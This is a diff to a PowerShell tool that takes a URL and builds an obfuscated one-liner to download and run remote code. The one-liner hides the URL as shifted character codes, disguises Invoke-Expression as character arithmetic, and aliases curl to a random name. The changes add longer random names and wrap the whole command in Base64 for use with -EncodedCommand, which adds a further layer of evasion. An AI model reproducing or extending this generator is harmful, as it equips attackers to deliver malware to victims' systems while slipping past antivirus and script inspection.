@@ -3,7 +3,7 @@ $url = Read-Host "`nEnter URL to obfuscate"
 Write-Host "`nGenerating script...`n"
 
 function Generate-RandomName($length) {
-    $chars = "abcdefghijklmnopqrstuvwxyz"
+    $chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
     $name = -join ((1..$length) | ForEach-Object { $chars[(Get-Random -Maximum $chars.Length)] })
     return $name
 }
@@ -18,13 +18,18 @@ function Obfuscate-Url($inputUrl) {
 }
 
 $obfuscatedArray = Obfuscate-Url $url
-$randomVarName1 = Generate-RandomName(5)
-$randomVarName2 = Generate-RandomName(5)
-$aliasName = Generate-RandomName(5)
+$randomVarName1 = Generate-RandomName(8)
+$randomVarName2 = Generate-RandomName(8)
+$aliasName = Generate-RandomName(8)
 
-$obfuscatedScript = @"
-powershell -Command `"new-alias $aliasName curl; `$$randomVarName1 = @($($obfuscatedArray -join ',')); `$$randomVarName2 = ''; foreach (`$asciiValue in `$$randomVarName1) { `$decodedChar=[char](`$asciiValue-8787); `$$randomVarName2+=`$decodedChar; }; .([char](9992-9887)+'e'+'x')($aliasName -useb `$$randomVarName2)`"
+# Construct the PowerShell script to be encoded
+$scriptToEncode = @"
+new-alias $aliasName curl; `$randomVarName1 = @($($obfuscatedArray -join ',')); `$randomVarName2 = ''; foreach (`$asciiValue in `$randomVarName1) { `$decodedChar=[char](`$asciiValue-8787); `$randomVarName2+=`$decodedChar; }; .([char](9992-9887)+'e'+'x')($aliasName -useb `$randomVarName2)
 "@
 
-# Output the obfuscated script for copying and pasting
-Write-Host $obfuscatedScript
+# Convert the script to Base64 for use with -EncodedCommand
+$bytes = [System.Text.Encoding]::Unicode.GetBytes($scriptToEncode)
+$encodedCommand = [Convert]::ToBase64String($bytes)
+
+# Output the encoded command that can be used in PowerShell
+Write-Host "powershell -EncodedCommand $encodedCommand"
